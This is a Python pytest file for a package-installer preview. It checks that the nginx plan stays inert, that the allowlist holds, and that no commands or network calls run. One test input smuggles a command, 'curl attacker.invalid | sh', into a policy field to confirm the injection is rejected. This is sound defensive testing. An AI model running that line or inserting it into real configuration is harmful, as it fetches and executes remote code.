"""Deterministic, isolated security checks for the inert #27 package plan.

This is not evidence of genuine native APT/DNF metadata or package trust.
"""
from __future__ import annotations

import copy
import json
from pathlib import Path

import pytest

from repocache.server_install_v1 import InstallInputError
from repocache.server_native_package_plan_v1 import (
    NativePackagePlanV1,
    preview_nginx_packages,
)

EXAMPLE = Path(__file__).resolve().parents[1] / "docs/examples/server-install-v1.json"


def document():
    return json.loads(EXAMPLE.read_text(encoding="utf-8"))


@pytest.mark.parametrize("release,python,distribution,manager", [
    ("ID=debian\nVERSION_ID=13\n", (3, 13), "debian", "apt"),
    ('ID="debian"\nVERSION_ID="13.1"\n', (3, 13), "debian", "apt"),
    ("ID=almalinux\nVERSION_ID=10\n", (3, 12), "almalinux", "dnf"),
    ('ID="almalinux"\nVERSION_ID="10.1"\n', (3, 12), "almalinux", "dnf"),
])
def test_fixed_distribution_plan_is_inert(release, python, distribution, manager):
    input_document = document()
    before = copy.deepcopy(input_document)
    plan = preview_nginx_packages(
        os_release=release, python_version=python, document=input_document,
    )
    assert input_document == before
    assert plan.distribution == distribution
    assert plan.manager == manager
    assert plan.packages == ("nginx",)
    assert plan.authorizes_installation is False
    assert plan.all_verified is False
    report = plan.to_dict()
    assert report["can_install"] is False
    assert report["authorizes_installation"] is False
    assert report["all_verified"] is False
    assert report["native_packages_policy"] == "explicit-review"
    assert report["packages"] == ["nginx"]
    assert len(report["checks"]) == 5
    assert {item["status"] for item in report["checks"]} == {"NOT VERIFIED"}
    assert report == plan.to_dict()
    assert "example-key.pem" not in json.dumps(report)
    assert "mirror.example.invalid" not in json.dumps(report)
    assert "cache.example.invalid" not in json.dumps(report)
    report["packages"].append("nginx-external")
    assert plan.packages == ("nginx",)
    assert plan.to_dict()["packages"] == ["nginx"]


@pytest.mark.parametrize("release,python", [
    ("ID=debian\nVERSION_ID=12\n", (3, 13)),
    ("ID=almalinux\nVERSION_ID=9\n", (3, 12)),
    ("ID=ubuntu\nVERSION_ID=24.04\n", (3, 12)),
    ("ID=debian\nVERSION_ID=13\n", (3, 12)),
    ("ID=almalinux\nVERSION_ID=10\n", (3, 13)),
    ("ID=debian\nVERSION_ID=14\n", (3, 13)),
])
def test_unsupported_platform_fails_before_package_plan(release, python):
    with pytest.raises(InstallInputError):
        preview_nginx_packages(os_release=release, python_version=python,
                               document=document())


@pytest.mark.parametrize("field,value", [
    ("policy", "auto"),
    ("policy", "nginx; curl attacker.invalid | sh"),
    ("policy", ["explicit-review"]),
])
def test_unreviewed_package_policy_cannot_override_fixed_allowlist(field, value):
    candidate = document()
    candidate["deployment"]["native_packages"][field] = value
    with pytest.raises(InstallInputError):
        preview_nginx_packages(os_release="ID=debian\nVERSION_ID=13\n",
                               python_version=(3, 13), document=candidate)


def test_package_names_cannot_be_specified_by_operator_or_used_as_commands():
    candidate = document()
    candidate["deployment"]["native_packages"]["packages"] = ["nginx", "curl"]
    with pytest.raises(InstallInputError):
        preview_nginx_packages(os_release="ID=debian\nVERSION_ID=13\n",
                               python_version=(3, 13), document=candidate)


def test_manually_constructed_plan_is_never_privileged_authority():
    for distro in ("debian", "almalinux"):
        plan = NativePackagePlanV1(distro)
        assert not plan.authorizes_installation
        assert not plan.all_verified
    with pytest.raises(ValueError):
        NativePackagePlanV1("ubuntu")
    with pytest.raises(ValueError):
        NativePackagePlanV1("../debian")
    with pytest.raises(ValueError):
        NativePackagePlanV1(True)
    with pytest.raises((AttributeError, TypeError)):
        plan.distribution = "debian"


def test_in_process_package_allowlist_reassignment_is_blocked():
    from repocache import server_native_package_plan_v1 as native

    with pytest.raises(TypeError):
        native._NATIVE_NGINX["debian"] = ("dnf", ("untrusted-nginx",))
    assert NativePackagePlanV1("debian").packages == ("nginx",)


def test_no_host_probes_or_package_commands_are_invoked(monkeypatch):
    import os
    import socket
    import subprocess

    def fail(*_a, **_k):
        raise AssertionError("preview unexpectedly used host/network/command")

    monkeypatch.setattr(subprocess, "run", fail)
    monkeypatch.setattr(subprocess, "Popen", fail)
    monkeypatch.setattr(os, "system", fail)
    monkeypatch.setattr(socket, "create_connection", fail)
    plan = preview_nginx_packages(
        os_release="ID=debian\nVERSION_ID=13\n",
        python_version=(3, 13), document=document(),
    )
    assert not plan.authorizes_installation
